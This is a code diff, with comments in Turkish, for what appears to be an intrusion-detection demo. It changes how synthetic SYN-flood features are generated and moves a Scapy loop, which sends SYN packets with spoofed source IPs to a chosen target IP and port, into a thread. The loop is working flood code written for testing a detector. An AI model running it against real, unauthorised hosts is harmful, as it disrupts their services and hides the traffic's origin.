@@ -6,33 +6,30 @@ from app.core import state
 import random
 import httpx
 import os
+import traceback # Hata ayıklama için eklendi
 
 INTERNAL_API_BASE_URL = os.getenv("INTERNAL_API_BASE_URL", "http://localhost:8000")
 
 def generate_fake_synflood_features():
-    """SYN Flood saldırısını, veri setindeki istatistiksel profillere daha yakın taklit eder."""
-    if not state.feature_columns:
-        print("⚠️ Feature columns not loaded for SYN Flood.")
-        return {}
-    
+    if not state.feature_columns: return {}
     features = {key: 0.0 for key in state.feature_columns}
-    
+
+    # Karakteristik: Anormal derecede kısa süre, sadece tek yönlü SYN paketi.
     features.update({
-        'Flow Duration': abs(random.gauss(2000, 1000)), 
-        'Total Fwd Packets': 1.0,
-        'Total Backward Packets': 0.0,
-        'Fwd Packet Length Max': 0.0,
-        'Fwd Packet Length Mean': 0.0,
-        'Bwd Packet Length Mean': 0.0,
-        'Flow IAT Mean': abs(random.gauss(50, 30)),
-        'Flow IAT Min': abs(random.gauss(10, 5)),
-        'SYN Flag Count': 1,
-        'Average Packet Size': 0.0,
+        'Flow_Duration':            random.uniform(1, 5000),      # Çok çok kısa: 1-5000 mikrosaniye
+        'Total_Fwd_Packets':        1.0,                          # Sadece 1 paket
+        'Total_Bwd_Packets':        0.0,                          # Geri paket YOK
+        'Total_Fwd_Bytes':          0.0,
+        'Total_Bwd_Bytes':          0.0,
+        'Fwd_Packet_Length_Mean':   0.0,
+        'Bwd_Packet_Length_Mean':   0.0,
+        'Packet_Length_Mean':       0.0,
+        'SYN_Flag_Count':           1.0,                          # EN ÖNEMLİ İMZA
+        'FIN_Flag_Count':           0.0,                          # Bağlantı kurulup kapatılmıyor
     })
     return features
 
 async def trigger_prediction(simulation_id: str):
-    """AI modelinin tahmin endpoint'ini tetikler."""
     try:
         features = generate_fake_synflood_features()
         fake_source_ip = f"10.42.{random.randint(1, 254)}.{random.randint(1, 254)}"
@@ -58,24 +55,40 @@ async def run_synflood_simulation(
     print(f"Starting SYN Flood Simulation: Target={params.target_ip}:{params.target_port}")
     sent_packets = 0
     await progress_callback({"type": "progress", "message": "Initiating SYN Flood...", "completed": 0, "total": params.num_packets})
-    try:
-        for i in range(params.num_packets):
-            source_ip = f"192.168.1.{random.randint(1, 254)}"
-            ip_layer = IP(src=source_ip, dst=params.target_ip)
-            tcp_layer = TCP(sport=RandShort(), dport=params.target_port, flags="S")
-            packet = ip_layer / tcp_layer
-            send(packet, verbose=0)
-            sent_packets += 1
-            if sent_packets % 50 == 0 or sent_packets == params.num_packets:
-                await progress_callback({"type": "progress", "message": f"Sent {sent_packets}/{params.num_packets} SYN packets...", "completed": sent_packets, "total": params.num_packets})
-                asyncio.create_task(trigger_prediction(simulation_run_id))
-            if params.delay_seconds > 0:
-                await asyncio.sleep(params.delay_seconds)
-    except Exception as e:
-        error_message = f"An error occurred during SYN Flood: {e}. Note: Sending raw packets might require root/administrator privileges."
+    
+    # Scapy işlemlerini asenkron olay döngüsünü bloklamamak için bir thread'de çalıştıralım.
+    def send_packets_sync():
+        nonlocal sent_packets
+        try:
+            for i in range(params.num_packets):
+                source_ip = f"192.168.1.{random.randint(1, 254)}"
+                ip_layer = IP(src=source_ip, dst=params.target_ip)
+                tcp_layer = TCP(sport=RandShort(), dport=params.target_port, flags="S")
+                packet = ip_layer / tcp_layer
+                send(packet, verbose=0)
+                sent_packets += 1
+                
+                # Her 20 pakette bir AI'ı tetikle, daha sık geri bildirim için.
+                if sent_packets % 20 == 0 or sent_packets == params.num_packets:
+                    asyncio.run(progress_callback({"type": "progress", "message": f"Sent {sent_packets}/{params.num_packets} SYN packets...", "completed": sent_packets, "total": params.num_packets}))
+                    asyncio.run(trigger_prediction(simulation_run_id))
+
+                if params.delay_seconds > 0:
+                    asyncio.run(asyncio.sleep(params.delay_seconds))
+            return {"status": "Completed", "error": None}
+        except Exception as e:
+            return {"status": "Failed", "error": e}
+            
+    # Ana asenkron fonksiyonda, senkron işlemi çalıştır
+    loop = asyncio.get_running_loop()
+    result_dict = await loop.run_in_executor(None, send_packets_sync)
+    
+    if result_dict["status"] == "Failed":
+        error_message = f"An error occurred during SYN Flood: {result_dict['error']}. Note: Sending raw packets might require root/administrator privileges."
         print(f"❌ {error_message}")
         await progress_callback({"type": "error", "message": error_message})
-        return {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Failed", "error": str(e)}
+        return {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Failed", "error": str(result_dict['error'])}
+        
     result = {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Completed"}
     await progress_callback({"type": "final_summary", "message": "SYN Flood simulation completed."})
     return result
